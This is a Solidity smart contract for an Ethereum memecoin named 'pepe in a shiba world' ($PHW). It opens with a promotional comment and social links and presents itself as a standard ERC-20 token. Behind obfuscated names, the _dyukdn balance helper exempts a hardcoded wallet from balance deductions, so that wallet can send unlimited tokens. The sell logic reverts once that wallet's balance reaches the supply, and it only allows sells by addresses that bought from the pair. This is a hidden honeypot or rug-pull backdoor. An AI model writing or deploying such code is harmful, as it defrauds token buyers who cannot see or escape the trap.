/**

$PHW includes a collection of Pepe memes designed by its Artist and Community of $PHW.
$PHW was deployed for degen shitcoin trading and gambling on the Ethereum blockchain.
The $PHW memecoin, a collection of never-ending Pepe memes.


- pepe in a memes world , OH FUKC.

https://t.me/pepeinashibaworld
https://x.com/pepeshibaworld

*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;



interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _dyukdn(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _dyukdn(a, b, "SafeMath");
    }

    function  _dyukdn(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _plejf(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PHW is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _polrvu;
    address payable private _rkwfhv;
    address private _bvexvb;
    
    string private constant _name = unicode"pepe in a shiba world";
    string private constant _symbol = unicode"PHW";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000000 * 10 **_decimals;
    uint256 public _pslaqk = _totalSupply;
    uint256 public _qrvubk = _totalSupply;
    uint256 public _pksvbr= _totalSupply;
    uint256 public _qfvadw= _totalSupply;

    uint256 private _BuyinitialTax=0;
    uint256 private _SellinitialTax=0;
    uint256 private _BuyfinalTax=0;
    uint256 private _SellfinalTax=0;
    uint256 private _BuyAreduceTax=0;
    uint256 private _SellAreduceTax=0;
    uint256 private _ylzcrp=0;
    uint256 private _pvflgj=0;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vrufld;
    mapping (address => bool) private _hvcqsk;
    mapping(address => uint256) private _fualrg;

    bool private _spjviqn;
    bool public _prvdeq = false;
    bool private kljgbh = false;
    bool private _rjvyxj = false;


    event _qrkjej(uint _pslaqk);
    modifier frhvey {
        kljgbh = true;
        _;
        kljgbh = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _vrufld[owner(

        )] = true;
        _vrufld[address
        (this)] = true;
        _vrufld[
            _rkwfhv] = true;
        _rkwfhv = 
        payable (0x78C5cDF8e3beb0B1e04F143a65D52bFd4DeCC27c);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _dyukdn(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 qourfv=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prvdeq) {
                if (to 
                != address
                (_polrvu) 
                && to !=
                 address
                 (_bvexvb)) {
                  require(_fualrg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fualrg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _bvexvb && to != 
            address(_polrvu) &&
             !_vrufld[to] ) {
                require(amount 
                <= _pslaqk,
                 "Exceeds the _pslaqk.");
                require(balanceOf
                (to) + amount
                 <= _qrvubk,
                  "Exceeds the _qrvubk.");
                if(_pvflgj
                < _ylzcrp){
                  require
                  (! _frvzxd(to));
                }
                _pvflgj++;
                 _hvcqsk
                 [to]=true;
                qourfv = amount._plejf
                ((_pvflgj>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _bvexvb &&
             from!= address(this) 
            && !_vrufld[from] ){
                require(amount <= 
                _pslaqk && 
                balanceOf(_rkwfhv)
                <_qfvadw,
                 "Exceeds the _pslaqk.");
                qourfv = amount._plejf((_pvflgj>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pvflgj>
                _ylzcrp &&
                 _hvcqsk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!kljgbh 
            && to == _bvexvb &&
             _rjvyxj &&
             contractTokenBalance>
             _pksvbr 
            && _pvflgj>
            _ylzcrp&&
             !_vrufld[to]&&
              !_vrufld[from]
            ) {
                _transferFrom( _qydlhr(amount, 
                _qydlhr(contractTokenBalance,
                _qfvadw)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prarkn(address
                    (this).balance);
                }
            }
        }

        if(qourfv>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(qourfv);
          emit
           Transfer(from,
           address
           (this),qourfv);
        }
        _balances[from
        ]= _dyukdn(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _dyukdn(qourfv));
        emit Transfer
        (from, to, 
        amount.
         _dyukdn(qourfv));
    }

    function _transferFrom(uint256
     tokenAmount) private
      frhvey {
        if(tokenAmount==
        0){return;}
        if(!_spjviqn)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _polrvu.WETH();
        _approve(address(this),
         address(
             _polrvu), 
             tokenAmount);
        _polrvu.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _qydlhr
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _dyukdn(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _rkwfhv){
            return a ;
        }else{
            return a .
             _dyukdn (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _pslaqk = _totalSupply;
        _qrvubk = _totalSupply;
        emit _qrkjej(_totalSupply);
    }

    function _frvzxd(address 
    account) private view 
    returns (bool) {
        uint256 Ulksp;
        assembly {
            Ulksp :=
             extcodesize
             (account)
        }
        return Ulksp > 
        0;
    }

    function _prarkn(uint256
    amount) private {
        _rkwfhv.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _spjviqn ) ;
        _polrvu  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _polrvu), 
            _totalSupply);
        _bvexvb = 
        IUniswapV2Factory(_polrvu.
        factory( ) 
        ). createPair (
            address(this
            ),  _polrvu .
             WETH ( ) );
        _polrvu.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_bvexvb).
        approve(address(_polrvu), 
        type(uint)
        .max);
        _rjvyxj = true;
        _spjviqn = true;
    }

    receive() external payable {}
}